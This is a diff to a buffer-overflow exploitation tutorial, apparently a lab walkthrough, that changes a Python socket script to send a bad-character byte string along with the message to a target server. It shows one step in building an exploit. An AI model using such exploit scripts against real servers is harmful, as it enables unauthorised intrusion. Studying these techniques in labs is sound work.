@@ -463,6 +463,10 @@ badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x1
     
     - In my case, I will save it as another file `2_fz3r0_brainstorm.py` 
 
+- Aditionally,  I will modify the line `s.send message` with this:
+
+    - `s.send(message + badchars + b'\r\n')` 
+
 ```python  
 #!/usr/bin/python
 
@@ -488,7 +492,7 @@ try:
         s.recv(1024)
         s.send(username + b'\r\n')
         s.recv(1024)
-        s.send(message + b'\r\n')    
+        s.send(message + badchars + b'\r\n')    
         s.recv(1024)
         s.close()
         
@@ -496,6 +500,7 @@ except:
         print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
         sys.exit()
 ```
+
 
 
 
